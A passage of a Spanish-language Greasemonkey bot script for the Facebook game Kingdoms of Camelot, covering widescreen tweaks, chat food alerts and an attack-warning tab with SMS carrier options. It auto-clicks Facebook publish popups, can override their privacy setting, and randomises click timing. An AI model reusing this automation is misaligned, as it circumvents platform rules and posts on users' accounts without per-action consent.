  Keep:			{1:{Food:0,Wood:0,Stone:0,Ore:0},2:{Food:0,Wood:0,Stone:0,Ore:0},3:{Food:0,Wood:0,Stone:0,Ore:0},4:{Food:0,Wood:0,Stone:0,Ore:0},5:{Food:0,Wood:0,Stone:0,Ore:0},6:{Food:0,Wood:0,Stone:0,Ore:0},7:{Food:0,Wood:0,Stone:0,Ore:0}},
  Enabled:		{1:false,2:false,3:false,4:false,5:false,6:false,7:false},
  SelectMax:			{1:false,2:false,3:false,4:false,5:false,6:false,7:false},
  Resource:		{1:true,2:true,3:true,4:true,5:true,6:true,7:true},
  UseIdlePop:		{1:true,2:true,3:true,4:true,5:true,6:true,7:true},
  };

var ResetAll=false;
var deleting=false;

var ChatOptions = {
  latestChats               : [],
  AllowUsersRemoteControl   : [],
  password                  : '',
  Chatpassenable            : false,
};

var nHtml={
  FindByXPath:function(obj,xpath,nodetype) {
	if(!nodetype){
		nodetype = XPathResult.FIRST_ORDERED_NODE_TYPE;
	}
	try {
		var q=document.evaluate(xpath,obj,null,nodetype,null);
	} catch(e) {
		GM_log('bad xpath:'+xpath);
	}
	if(nodetype == XPathResult.FIRST_ORDERED_NODE_TYPE){
		if(q && q.singleNodeValue) { return q.singleNodeValue; }
	}else{
		if(q){
			return q;
		}
	}
	return null;
  },

  ClickWin:function(win,obj,evtName) {
	var evt = win.document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, win,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
  },

  Click:function(obj) {
	return this.ClickWin(window,obj,'click');
  },

  ClickTimeout:function(obj,millisec) {
	window.setTimeout(function() {
		return nHtml.ClickWin(window,obj,'click');
	},millisec+Math.floor(Math.random()*500));
  },

  SetSelect:function(obj,v) {
	for(var o=0; o<obj.options.length; o++) {
		if(v==obj.options[o].value) { obj.options[o].selected=true; return true; }
	}
	return false;
  },

}

readGlobalOptions ();

if (document.URL.search(/apps.facebook.com\/kingdomsofcamelot/i) >= 0){
  facebookInstance ();
  return;
}
if (document.URL.search(/facebook.com\/connect\/uiserver.php/i) >= 0){
  HandlePublishPopup ();
  return;
}
if (document.URL.search(/kingdomsofcamelot.com/i) >= 0){
  kocWideScreen ();
}

function kocWideScreen(){
  function setWide (){
  var kocFrame = parent.document.getElementById('kofc_iframe_0');
	if (!kocFrame){
	  setTimeout (setWide, 1000);
	  return;
	}
 kocFrame.style.width = '100%';
			var style = document.createElement('style')
			style.innerHTML = 'body {margin:0; width:100%; !important;}';
   kocFrame.parentNode.appendChild(style);
  }
  kocWatchdog ();
  if (GlobalOptions.pbWideScreen)
    setWide();
}

/***  Run only in "apps.facebook.com" instance ... ***/
function facebookInstance (){
  function setWide (){
	var iFrame = document.getElementById('iframe_canvas');
	if (!iFrame){
	  setTimeout (setWide, 1000);
	  return;
	}
	iFrame.style.width = '100%';

	while ( (iFrame=iFrame.parentNode) != null)
	  if (iFrame.tagName=='DIV')
		iFrame.style.width = '100%';
		document.getElementById('globalContainer').style.left = '0px';
    try{
      document.getElementById('rightCol').parentNode.removeChild(document.getElementById('rightCol'));
      document.getElementById('leftColContainer').parentNode.removeChild(document.getElementById('leftColContainer'));
    } catch (e){
      // toolkit may have removed them already!
    }
    var e = document.getElementById('mainContainer');
	if(e){
		if (GlobalOptions.pbWideScreenStyle=="normal") e.parentNode.style.minWidth = '100%';
		if (GlobalOptions.pbWideScreenStyle=="wide") e.parentNode.style.width = '1520px';
		if (GlobalOptions.pbWideScreenStyle=="ultra") e.parentNode.style.width = '1900px';
		for(i=0; i<e.childNodes.length; i++){
			if(e.childNodes[i].id == 'contentCol'){
				e.childNodes[i].style.margin = '0px';
				e.childNodes[i].style.paddingTop = '5px';
				break;
			}
		}
	}
	var e = document.getElementById('pageHead');
	if(e){
		e.style.width = '80%';
		e.style.margin = '0 10%';
	}
	var e = document.getElementById('bottomContent');
	if(e){
		e.style.padding = "0px 0px 12px 0px";
	}

  }
  facebookWatchdog();
  if (GlobalOptions.pbWideScreen)
    setWide();
}

function HandlePublishPopup() {
	if(GlobalOptions.autoPublishGamePopups){
		// Check the app id (we only want to handle the popup for kingdoms of camelot)
		var FBInputForm = document.getElementById('uiserver_form');
		if(FBInputForm){
			var channel_input = nHtml.FindByXPath(FBInputForm,".//input[contains(@name,'channel')]");
			if(channel_input){
				var current_channel_url = channel_input.value;
				if (current_channel_url.match(/http:\/\/.{0,100}kingdomsofcamelot\.com\/.*?\/cross_iframe\.htm/i)) {
					var publish_button = nHtml.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'publish')]");
					var privacy_setting = nHtml.FindByXPath(FBInputForm,".//input[@type='hidden' and contains(@name, 'privacy_data') and contains(@name, 'value')]");
					if(publish_button && privacy_setting){
						// 80: Everyone
						// 50: Friends of Friends
						// 40: Friends Only
						// 10: Only Me
						if(privacy_setting.value != GlobalOptions.autoPublishPrivacySetting && GlobalOptions.autoPublishPrivacySetting != 0)
						privacy_setting.value = GlobalOptions.autoPublishPrivacySetting;
						nHtml.Click(publish_button);
					}
				}
			}
		}
		setTimeout(HandlePublishPopup, 1000);
	}
}

var Cities = {};
var Seed = unsafeWindow.seed;
var Tabs = {};
var mainPop;
var pbStartupTimer = null;
var CPopUpTopClass = 'pbPopTop';
var firefoxVersion = getFirefoxVersion();
var TrainCity = 0;

function pbStartup (){
  clearTimeout (pbStartupTimer);
  if (unsafeWindow.pbLoaded)
    return;
  var metc = getClientCoords(document.getElementById('main_engagement_tabs'));
  if (metc.width==null || metc.width==0){
    pbStartupTimer = setTimeout (pbStartup, 1000);
    return;
  }
  unsafeWindow.pbLoaded = true;
  logit ("Versión de cliente KofC: "+ anticd.getKOCversion());

  Seed = unsafeWindow.seed;
  var styles = '.xtab {padding-right: 5px; border:none; background:none; white-space:nowrap;}\
    .xtabBR {padding-right: 5px; border:none; background:none;}\
    table.pbTab tr td {border:none; background:none; white-space:nowrap; padding:0px}\
    .hostile td { background:red; }.friendly td{background:lightgreen; }.ally td{background:lightblue; }\
	table.pbTabPadNW tr td {border:none; background:none; white-space:nowrap; padding: 2px 4px 2px 8px;}\
    table.pbTabBR tr td {border:none; background:none;}\
    table.pbTabLined tr td {border:1px none none solid none; padding: 2px 5px; white-space:nowrap;}\
    table.pbOptions tr td {border:1px none none solid none; padding: 1px 3px; white-space:nowrap;}\
	table.pbSrchResults tr td {border:1px none none solid none; padding: 1px 3px; white-space:nowrap;}\
    table.pbTabSome tr td {border:none; background:none; padding: 1px 3px; white-space:nowrap;}\
	table.pbTabPad tr td.ptentry {background-color:#ffeecc; padding-left: 8px;}\
    table.ptNoPad tr td {border:none; background:none; white-space:nowrap; padding:0px}\
    .pbDetLeft {padding:0 5px 0 0 !important; font-weight:bold; text-align:right}\
    .pbStat {border:1px solid; border-color:#ffffff; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:#ffffff; background-color:#357}\
    .ptentry {padding: 7px; border:1px solid; border-color:#000000; background-color:#ffeecc; white-space:nowrap;}\
    .ptErrText {font-weight:bold; color:#600000}\
    .castleBut {outline:0px; margin-left:0px; margin-right:0px; width:24px; height:26px; font-size:12px; font-weight:bold;}\
    .castleBut:hover {border-size:3px; border-color:#000;}\
    button::-moz-focus-inner, input[type="submit"]::-moz-focus-inner { border: none; }\
	span.whiteOnRed {padding-left:3px; padding-right:3px; background-color:#700; color:white; font-weight:bold}\
    span.boldRed {color:#800; font-weight:bold}\
    .castleButNon {background-image:url("'+ URL_CASTLE_BUT +'")}\
    .castleButSel {background-image:url("'+ URL_CASTLE_BUT_SEL +'")}\
	input.pbDefButOn {cursor:pointer; border:1px solid black; background-color:red;}\
    input.pbDefButOff {cursor:pointer; border:1px solid black; background-color:#0a0;}\
    a.ptButton20 {color:#ffff80}\
    table.pbMainTab {empty-cells:show; margin-top:5px }\
    table.pbMainTab tr td a {color:inherit }\
    table.pbMainTab tr td   {height:60%; empty-cells:show; padding: 0px 4px 0px 4px;  margin-top:5px; white-space:nowrap; border: 1px solid; border-style: none none solid none; }\
    table.pbMainTab tr td.spacer {padding: 0px 0px;}\
    table.pbMainTab tr td.sel    {font-weight:bold; font-size:13px; border: 1px solid; border-style: solid solid solid solid; background-color:#eed;}\
    table.pbMainTab tr td.notSel {font-weight:bold; font-size:13px; border: 1px solid; border-style: solid solid solid solid; background-color:#00a044; color:white; border-color:black;}\
     tr.pbPopTop td { background-color:#ded; border:none; height: 21px;  padding:0px; }\
    tr.pbretry_pbPopTop td { background-color:#a00; color:#fff; border:none; height: 21px;  padding:0px; }\
    tr.pbMainPopTop td { background-color:#ded; border:none; height: 42px;  padding:0px; }\
    tr.pbretry_pbMainPopTop td { background-color:#a00; color:#fff; border:none; height: 42px;  padding:0px; }\
	.CPopup .CPopMain { background-color:#f8f8f8; padding:6px;}\
    .CPopup  {border:3px ridge #666}\
	span.pbTextFriendly {color: #080}\
    span.pbTextHostile {color: #800}\
	.pbButCancel {background-color:#a00; font-weight:bold; color:#fff}\
    div.indent25 {padding-left:25px}';

  window.name = 'PT';
  logit ("* KOC Power Bot v"+ Version +" Cargado");
  readOptions();
  readChatOptions();
  readCrestOptions();
  readTrainingOptions();
  setCities();

// TODO: Make sure WinPos is visible on-screen ?
  if (Options.pbWinPos==null || Options.pbWinPos.x==null|| Options.pbWinPos.x=='' || isNaN(Options.pbWinPos.x)){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    Options.pbWinPos.y = c.y+c.height;
    saveOptions ();
  }

  // Reset window xPos if the widescreen option is disabled
  if(!GlobalOptions.pbWideScreen && Options.pbWinPos.x > 700){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    saveOptions ();
  }

  mainPop = new CPopup ('pb', Options.pbWinPos.x, Options.pbWinPos.y, 1020,700, Options.pbWinDrag, //dimensiones de la ventana
      function (){
        tabManager.hideTab();
        Options.pbWinIsOpen=false;
        saveOptions()
      });
  mainPop.autoHeight (true);

  mainPop.getMainDiv().innerHTML = '<STYLE>'+ styles +'</style>';
  AddMainTabLink('Power BOT', eventHideShow, mouseMainTab);
  tabManager.init (mainPop.getMainDiv());
  actionLog ("KOC Power Bot v"+ Version +" Cargado  (KofC versión: "+ anticd.getKOCversion() +")");

  FairieKiller.init (Options.pbKillFairie);
  RefreshEvery.init ();
  SpamEvery.init ();
  CollectGold.init();
  FoodAlerts.init();
  ChatPane.init();
  ChatStuff.init();
  DeleteReports.init();
  if (Options.pbWinIsOpen && Options.pbTrackOpen){
    mainPop.show (true);
    tabManager.showTab();
  }
  window.addEventListener('unload', onUnload, false);
  exportToKOCattack.init();
  WideScreen.init ();
  WideScreen.setChatOnRight (Options.pbChatOnRight);
  WideScreen.useWideMap (Options.pbWideMap);
  setInterval (DrawLevelIcons,1250);
}

/************************ Food Alerts *************************/
var FoodAlerts = {

  init : function (){
   var f = FoodAlerts;
   f.e_eachMinute();
  },

  minuteTimer : null,

  e_eachMinute : function (){
    var f = FoodAlerts;
    var now = unixTime();
      row = [];

      for(i=0; i < Cities.numCities; i++) {
        var rp = getResourceProduction (Cities.cities[i].id);
        var foodleft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0])/3600;
        var usage = rp[1] - parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][3]);
        row[i] = rp[1] - usage;
          var timeLeft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0]) / 3600 / (0-usage) * 3600;
          var msg = '';
        if (usage < 0) {
    if (Options.pbFoodAlert && timeLeft<(4*3600)) {
                msg += 'La Ciudad ' + Cities.cities[i].name.substring(0,10) + ' (' +
                      Cities.cities[i].x +','+ Cities.cities[i].y + ')';
                msg += ' esta escasa de alimento, si este mensaje se repite, por favor quien pueda mande alimento a esas coordenadas. Alimento restante: '+addCommasWhole1(foodleft)+' ('+timestrShort(timeLeft)+') Mantenimiento: '+addCommasWhole1(usage)+' por hora';
                sendChat ("/a " + msg);
          }
    }
      }
  f.minuteTimer = setTimeout (f.e_eachMinute, 1800000);
  },
}




/****************************  Tower Tab  ******************************/
Tabs.tower = {
    tabOrder: 1,
    tabLabel: 'Torre',
    myDiv: null,
	generateIncomingFunc : null,
	fixTargetEnabled : false,
	secondTimer : null,
	soundPlaying : false,
	defMode : {},
	soundRepeatTimer : null,
	soundStopTimer : null,
	towerMarches: [],
	Providers : {
		0: { 'country': "--Country--", 'provider': "--Provider--" },
        1: { 'country': "AUSTRALIA", 'provider': "T-Mobile" },
        2: { 'country': "AUSTRALIA", 'provider': "Optus Zoo" },
        3: { 'country': "AUSTRIA", 'provider': "T-Mobile" },
        4: { 'country': "BULGARIA", 'provider': "Mtel" },
        5: { 'country': "BULGARIA", 'provider': "Globul" },
        6: { 'country': "CANADA", 'provider': "Aliant" },
        7: { 'country': "CANADA", 'provider': "Bell Mobility" },
        8: { 'country': "CANADA", 'provider': "Fido" },
        9: { 'country': "CANADA", 'provider': "MTS Mobility" },
        10: { 'country': "CANADA", 'provider': "Rogers Wireless" },
        11: { 'country': "CANADA", 'provider': "Sasktel Mobility" },
        12: { 'country': "CANADA", 'provider': "Telus" },
        13: { 'country': "CANADA", 'provider': "Virgin Mobile" },
        14: { 'country': "CANADA", 'provider': "Presidents Choice" },
        15: { 'country': "GERMANY", 'provider': "T-Mobile" },
        16: { 'country': "GERMANY", 'provider': "Vodafone" },
        17: { 'country': "GERMANY", 'provider': "O2" },
        18: { 'country': "GERMANY", 'provider': "E-Plus" },
        19: { 'country': "ICELAND", 'provider': "OgVodafone" },
        20: { 'country': "ICELAND", 'provider': "Siminn" },
        21: { 'country': "INDIA", 'provider': "Andhra Pradesh AirTel" },
        22: { 'country': "INDIA", 'provider': "Andhra Pradesh Idea Cellular" },
        23: { 'country': "INDIA", 'provider': "Chennal Skycell Airtel" },
        24: { 'country': "INDIA", 'provider': "Chennel RPG Cellular" },
        25: { 'country': "INDIA", 'provider': "Delhi Airtel" },
        26: { 'country': "INDIA", 'provider': "Delhi Hutch" },
        27: { 'country': "INDIA", 'provider': "Gujarat Idea Cellular" },
        28: { 'country': "INDIA", 'provider': "Gujaret Airtel" },
        29: { 'country': "INDIA", 'provider': "Gujaret Celforce" },
        30: { 'country': "INDIA", 'provider': "Goa Airtel" },
        31: { 'country': "INDIA", 'provider': "Goa BPL Mobile" },
        32: { 'country': "INDIA", 'provider': "Goa Idea Cellular" },
        33: { 'country': "INDIA", 'provider': "Haryana Airtel" },
        34: { 'country': "INDIA", 'provider': "Haryana Escotel" },
        35: { 'country': "INDIA", 'provider': "Himachal Pradesh Airtel" },
        36: { 'country': "INDIA", 'provider': "Karnataka Airtel" },
        37: { 'country': "INDIA", 'provider': "Kerala Airtel" },
        38: { 'country': "INDIA", 'provider': "Kerala Escotel" },
        39: { 'country': "INDIA", 'provider': "Kerala BPL Mobile" },
        40: { 'country': "INDIA", 'provider': "Kolkata Airtel" },
        41: { 'country': "INDIA", 'provider': "Madhya Pradesh Airtel" },
        42: { 'country': "INDIA", 'provider': "Maharashtra Airtel" },
        43: { 'country': "INDIA", 'provider': "Maharashtra BPL Mobile" },
        44: { 'country': "INDIA", 'provider': "Maharashtra Idea Cellular" },
        45: { 'country': "INDIA", 'provider': "Mumbai Airtel" },
        46: { 'country': "INDIA", 'provider': "Mumbai BPL Mobile" },
        47: { 'country': "INDIA", 'provider': "Punjab Airtel" },
        48: { 'country': "INDIA", 'provider': "Pondicherry BPL Mobile" },
        49: { 'country': "INDIA", 'provider': "Tamil Nadu Airtel" },
        50: { 'country': "INDIA", 'provider': "Tamil Nadu BPL Mobile" },
        51: { 'country': "INDIA", 'provider': "Tamil Nadu Aircel" },
        52: { 'country': "INDIA", 'provider': "Uttar Pradesh West Escotel" },
        53: { 'country': "IRELAND", 'provider': "Meteor" },
        54: { 'country': "IRELAND", 'provider': "Meteor MMS" },
        55: { 'country': "ITALY", 'provider': "TIM" },
        56: { 'country': "ITALY", 'provider': "Vodafone" },
        57: { 'country': "JAPAN", 'provider': "AU by KDDI" },
        58: { 'country': "JAPAN", 'provider': "NTT DoCoMo" },
        59: { 'country': "JAPAN", 'provider': "Vodafone Chuugoku/Western" },
        60: { 'country': "JAPAN", 'provider': "Vodafone Hokkaido" },
        61: { 'country': "JAPAN", 'provider': "Vodafone Hokuriko/Central North" },
        62: { 'country': "JAPAN", 'provider': "Vodafone Kansai/West, including Osaka" },
        63: { 'country': "JAPAN", 'provider': "Vodafone Kanto/Koushin/East including Tokyo" },
        64: { 'country': "JAPAN", 'provider': "Vodafone Kyuushu/Okinawa" },
        65: { 'country': "JAPAN", 'provider': "Vodafone Shikoku" },
        66: { 'country': "JAPAN", 'provider': "Vodafone Touhoku/Niigata/North" },
        67: { 'country': "JAPAN", 'provider': "Vodafone Toukai/Central" },
        68: { 'country': "JAPAN", 'provider': "Willcom" },
        69: { 'country': "JAPAN", 'provider': "Willcom di" },
        70: { 'country': "JAPAN", 'provider': "Willcom dj" },
        71: { 'country': "JAPAN", 'provider': "Willcom dk" },
        72: { 'country': "NETHERLANDS", 'provider': "T-Mobile" },
        73: { 'country': "NETHERLANDS", 'provider': "Orange" },
        74: { 'country': "SINGAPORE", 'provider': "M1" },
        75: { 'country': "SOUTH AFRICA", 'provider': "Vodacom" },
        76: { 'country': "SPAIN", 'provider': "Telefonica Movistar" },
        77: { 'country': "SPAIN", 'provider': "Vodafone" },
        78: { 'country': "SWEDEN", 'provider': "Tele2" },
        79: { 'country': "UNITED STATES", 'provider': "Teleflip" },
        80: { 'country': "UNITED STATES", 'provider': "Alltel" },
        81: { 'country': "UNITED STATES", 'provider': "Ameritech" },
        82: { 'country': "UNITED STATES", 'provider': "ATT Wireless" },
        83: { 'country': "UNITED STATES", 'provider': "Bellsouth" },
        84: { 'country': "UNITED STATES", 'provider': "Boost" },
        85: { 'country': "UNITED STATES", 'provider': "CellularOne" },
        86: { 'country': "UNITED STATES", 'provider': "CellularOne MMS" },
        87: { 'country': "UNITED STATES", 'provider': "Cingular" },
        88: { 'country': "UNITED STATES", 'provider': "Edge Wireless" },
        89: { 'country': "UNITED STATES", 'provider': "Sprint PCS" },
        90: { 'country': "UNITED STATES", 'provider': "T-Mobile" },
        91: { 'country': "UNITED STATES", 'provider': "Metro PCS" },
        92: { 'country': "UNITED STATES", 'provider': "Nextel" },
        93: { 'country': "UNITED STATES", 'provider': "O2" },
        94: { 'country': "UNITED STATES", 'provider': "Orange" },
        95: { 'country': "UNITED STATES", 'provider': "Qwest" },
        96: { 'country': "UNITED STATES", 'provider': "Rogers Wireless" },
        97: { 'country': "UNITED STATES", 'provider': "Telus Mobility" },
        98: { 'country': "UNITED STATES", 'provider': "US Cellular" },
        99: { 'country': "UNITED STATES", 'provider': "Verizon" },
        100: { 'country': "UNITED STATES", 'provider': "Virgin Mobile" },
        101: { 'country': "UNITED KINGDOM", 'provider': "O2 1" },
        102: { 'country': "UNITED KINGDOM", 'provider': "O2 2" },
        103: { 'country': "UNITED KINGDOM", 'provider': "Orange" },
        104: { 'country': "UNITED KINGDOM", 'provider': "T-Mobile" },
        105: { 'country': "UNITED KINGDOM", 'provider': "Virgin Mobile" },
        106: { 'country': "UNITED KINGDOM", 'provider': "Vodafone" },
        107: { 'country': "BELGIUM", 'provider': "mobistar" },
        108: { 'country': "GERMANY", 'provider': "1und1" },
        109: { 'country': "UNITED STATES", 'provider': "MyCricket" },
        110: { 'country': "Philippines", 'provider': "Smart" },
        111: { 'country': "UNITED STATES", 'provider': "CellularSouth" }
    },

    init: function(div){
		var t = Tabs.tower;
        t.myDiv = div;

    if (GM_getValue ('towerMarches_'+getServerId()) != null)
      GM_deleteValue ('towerMarches_'+getServerId());   // remove deprecated data if it exists
    //t.generateIncomingFunc = new CalterUwFunc ('attack_generateincoming', [[/.*} else {\s*e = true;\s*}/im, '} else { e = ptGenerateIncoming_hook(); }']]);
    //unsafeWindow.ptGenerateIncoming_hook = t.generateIncoming_hook;

    var m = '<DIV class=pbStat>TORRE DE VIGILANCIA</div><TABLE class=pbTab><TR align=center>';

	  for (var i=0; i<Cities.cities.length; i++)
      m += '<TD width=95><SPAN id=pbtacity_'+ i +'>' + Cities.cities[i].name + '</span></td>';
    m += '</tr><TR align=center>';
	  for (var cityId in Cities.byID)
      m += '<TD><INPUT type=submit id=pbtabut_'+ cityId +' value=""></td>';
	  m += '<SPAN class=boldRed><center>Activar o desactivar defensa ciudades</spam></center></tr><TR align=center>';
	  for (var cityId in Cities.byID)
	   m += '<TD><CENTER><INPUT id=pbattackqueue_' + cityId + ' type=submit value="A 0 | D 0"></center></td>';
    m += '</tr></table><BR><DIV><CENTER><INPUT id=pbSoundStop type=submit value="Parar sonido"></center></div><DIV id=pbSwfPlayer></div>';
    m += '<BR><DIV class=pbStat>CONFIGURACIÓN</div><TABLE class=pbTab>\
    <tr><td align=left><INPUT id=pbcellenable type=checkbox '+ (Options.celltext.atext?'CHECKED ':'') +'/></td>\
    <td align=left>Mensaje de texto de ataque entrante al telefono nº: <INPUT id=pbnum1 type=text size=4 maxlength=4 value="'+ Options.celltext.num1 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\>\
	&nbsp;<INPUT id=pbnum2 type=text size=3 maxlength=3 value="'+ Options.celltext.num2 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\>\
&nbsp;<INPUT id=pbnum3 type=text size=4 maxlength=4 value="'+ Options.celltext.num3 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\> <span style="color:#800; font-weight:bold">(Se aplican las tarifas estándar de mensajes de texto )</span></td></tr><tr><td></td>\
    <TD align=left>Pais: <select id="pbfrmcountry">';
    for (var i in t.Providers) {
       var ret=m.indexOf(t.Providers[i].country);
       if (ret==-1) {
         if (t.Providers[i].country==t.Providers[Options.celltext.provider].country) {
           m += '<option value="'+t.Providers[i].country+'" selected="selected">'+t.Providers[i].country+'</option>'; // Load Previous Provider Selection
         }
         else {
           m += '<option value="'+t.Providers[i].country+'">'+t.Providers[i].country+'</option>';
         }
       }
    }

    m += '</select>\
    <select id="pbfrmprovider" '+(Options.celltext.provider==0?'DISABLED':'')+'><option value=0 >--Proveedor--</option>';
    for (var i in t.Providers) {
 if(t.Providers[i].country == t.Providers[Options.celltext.provider].country)
		if(Options.celltext.provider == i)
			m += '<option value="'+i+'" selected="selected">'+t.Providers[i].provider+'</option>'; // Load Previous Provider Selection
		else
           m += '<option value="'+i+'">'+t.Providers[i].provider+'</option>';
    }
    m += '</select></td></tr>\
		<TR><TD><INPUT id=pbalertEnable type=checkbox '+ (Options.alertConfig.aChat?'CHECKED ':'') +'/></td><TD>Postear automaticamente ataque en chat de alianza.</td></tr>\
        <TR><TD></td><TD><TABLE cellpadding=0 cellspacing=0>\
		<TR><TD align=right>Mensaje estandar: &nbsp; </td><TD><INPUT id=pbalertPrefix type=text size=60 maxlength=120 value="'+ Options.alertConfig.aPrefix +'" /></td></tr>\
		<TR><TD align=right>Alerta de Exploración: &nbsp; </td><TD><INPUT id=pbalertScout type=checkbox '+ (Options.alertConfig.scouting?'CHECKED ':'') +'/></td></tr>\
        <TR><TD align=right>Alerta de ataque a tierras: &nbsp; </td><TD><INPUT id=pbalertWild type=checkbox '+ (Options.alertConfig.wilds?'CHECKED ':'') +'/></td></tr>\
       <TR><TD align=right>Mostrar estado defensivo: &nbsp; </td><TD><INPUT id=pbalertDefend type=checkbox '+ (Options.alertConfig.defend?'CHECKED ':'') +'/></td></tr>\
       <TR><TD align=right>Minimo de tropas: &nbsp; </td><TD><INPUT id=pbalertTroops type=text size=7 value="'+ Options.alertConfig.minTroops +'" \> &nbsp; &nbsp; <span id=pbalerterr></span></td></tr>\
        </table></td></tr>\
		<TR><TD align=right><INPUT id=pbalertraid type=checkbox '+ (Options.alertConfig.raid?'CHECKED':'') +'/></td><TD>Parar RAID en caso de ataque.</td></tr>\
         <TR><TD><BR></td></tr>\
        <TR><TD><INPUT id=pbSoundEnable type=checkbox '+ (Options.alertSound.enabled?'CHECKED ':'') +'/></td><TD>Activar sonido en caso de Ataque ó Exploración</td></tr>\
        <TR><TD></td><TD><DIV id=pbLoadingSwf>Cargando SWF player</div><DIV style="display:none" id=pbSoundOpts><TABLE cellpadding=0 cellspacing=0>\
            <TR><TD align=right>Archivo de sonido: &nbsp; </td><TD><INPUT id=pbsoundFile type=text size=55 maxlength=160 value="'+ Options.alertSound.soundUrl +'" \>\
             &nbsp; </td><TD><INPUT id=pbSoundLoad type=submit value=Cargar><INPUT id=pbSoundDefault type=submit value="Por Defecto"></td></tr>\
            <TR><TD align=right>Volumen: &nbsp; </td><TD><TABLE cellpadding=0 cellspacing=0 class=pbTab><TR valign=middle><TD><SPAN id=pbVolSlider></span></td><TD width=15></td><TD align=right id=pbVolOut>0</td></td></table></td><TD align=center><SPAN id=pbLoadStat>xx</span></td></tr>\
            <TR><TD align=right><INPUT id=pbSoundRepeat type=checkbox '+ (Options.alertSound.repeat?'CHECKED ':'') +'/></td><TD> Repetir cada <INPUT id=pbSoundEvery type=text size=2 maxlength=5 value="'+ Options.alertSound.repeatDelay +'"> minutos</td></tr>\
            <TR><TD></td><TD>Sonar durante <INPUT id=pbSoundLength type=text size=3 maxlength=5 value="'+ Options.alertSound.playLength +'"> sgs</td></tr>\
            <TR><TD></td><TD><INPUT type=submit value="Probar" id=pbPlayNow></td></tr><td><tr><SPAN class=boldRed>Si te apetece otro sonido diferente, solo tienes que ponerle la ruta del mismo y Cargar, sino por Defecto.\
			El formato debe ser .mp3<br>Ej: C:rutadelarchivo.mp3</spam></td></tr></table></div></td></tr>\
        </table><BR>';
    	t.myDiv.innerHTML = m;

//    t.mss = new CmatSimpleSound(SWF_PLAYER_URL, null, {height:36, width:340}, t.e_swfLoaded, 'debug=y');
    t.mss = new CmatSimpleSound(SWF_PLAYER_URL, null, {height:0, width:0}, t.e_swfLoaded, 'debug=n');
    t.mss.swfDebug = function (m){ logit ('SWF: '+ m)};
    t.mss.swfPlayComplete = t.e_soundFinished;
    t.mss.swfLoadComplete = t.e_soundFileLoaded;
    unsafeWindow.matSimpleSound01 = t.mss;   // let swf find it

    t.volSlider = new SliderBar (document.getElementById('pbVolSlider'), 200, 21, 0);
    t.volSlider.setChangeListener(t.e_volChanged);
    document.getElementById('pbPlayNow').addEventListener ('click', function (){t.playSound(false)}, false);
    document.getElementById('pbSoundStop').addEventListener ('click', t.stopSoundAlerts, false);
    document.getElementById('pbSoundRepeat').addEventListener ('change', function (e){Options.alertSound.repeat = e.target.checked}, false);
    document.getElementById('pbSoundEvery').addEventListener ('change', function (e){Options.alertSound.repeatDelay = e.target.value}, false);
    document.getElementById('pbSoundLength').addEventListener ('change', function (e){Options.alertSound.playLength = e.target.value}, false);
    document.getElementById('pbSoundEnable').addEventListener ('change', function (e){Options.alertSound.enabled = e.target.checked}, false);
    document.getElementById('pbcellenable').addEventListener ('change', function (e){Options.celltext.atext = e.target.checked;}, false);
	document.getElementById('pbSoundStop').disabled = true;
    document.getElementById('pbalertEnable').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertPrefix').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertScout').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertWild').addEventListener ('change', t.e_alertOptChanged, false);
	document.getElementById('pbalertDefend').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertTroops').addEventListener ('change', t.e_alertOptChanged, false);
	document.getElementById('pbfrmcountry').addEventListener ('change', t.setCountry, false);
    document.getElementById('pbfrmprovider').addEventListener ('change', t.setProvider, false);
    document.getElementById('pbnum1').addEventListener ('change', t.phonenum, false);
    document.getElementById('pbnum2').addEventListener ('change', t.phonenum, false);
    document.getElementById('pbnum3').addEventListener ('change', t.phonenum, false);
	document.getElementById('pbalertraid').addEventListener ('change', t.e_alertOptChanged, false);
	document.getElementById('pbsoundFile').addEventListener ('change', function (){
        Options.alertSound.soundUrl = document.getElementById('pbsoundFile').value;
        t.loadUrl (Options.alertSound.soundUrl);
      }, false);
    document.getElementById('pbSoundDefault').addEventListener ('click', function (){
        document.getElementById('pbsoundFile').value = DEFAULT_ALERT_SOUND_URL;
        Options.alertSound.soundUrl = DEFAULT_ALERT_SOUND_URL;
        t.loadUrl (DEFAULT_ALERT_SOUND_URL);
      }, false);

    for (var cityId in Cities.byID){
  	  var but = document.getElementById ('pbtabut_'+ cityId);
  	  addListener (but, cityId);
  	  t.defMode[cityId] =  parseInt(Seed.citystats["city" + cityId].gate);
  	  t.displayDefMode (cityId);
		var btnNameT = 'pbattackqueue_' + cityId;
      addTowerEventListener(cityId, btnNameT);
 			}
    function addListener (but, i){
      but.addEventListener ('click', function (){t.butToggleDefMode(i)}, false);
         }
	function addTowerEventListener(cityId, name){
        document.getElementById(name).addEventListener('click', function(){
            t.showTowerIncoming(cityId);
        }, false);
    }
    setInterval (t.eachSecond, 2000);
  },

  show : function (){
  },

  hide : function (){
  },

  loadUrl : function (url){
    var t = Tabs.tower;
    t.mss.load (1, url, true);
    document.getElementById('pbLoadStat').innerHTML = 'Loading';
  },
  phonenum : function() {
   Options.celltext.num1 = document.getElementById('pbnum1').value;
   Options.celltext.num2 = document.getElementById('pbnum2').value;
   Options.celltext.num3 = document.getElementById('pbnum3').value;
   saveOptions();
  },

  setCountry : function(){
    var t = Tabs.tower;
    var myselect=document.getElementById("pbfrmprovider");
	myselect.innerHTML = '<option value=0 >--Proveedor--</option>';
	myselect.disabled = true;
    for (var i in t.Providers) {
     if (t.Providers[i].country == document.getElementById("pbfrmcountry").value){
		var addoption = document.createElement('option');
		addoption.value = i;
		addoption.text = t.Providers[i].provider;
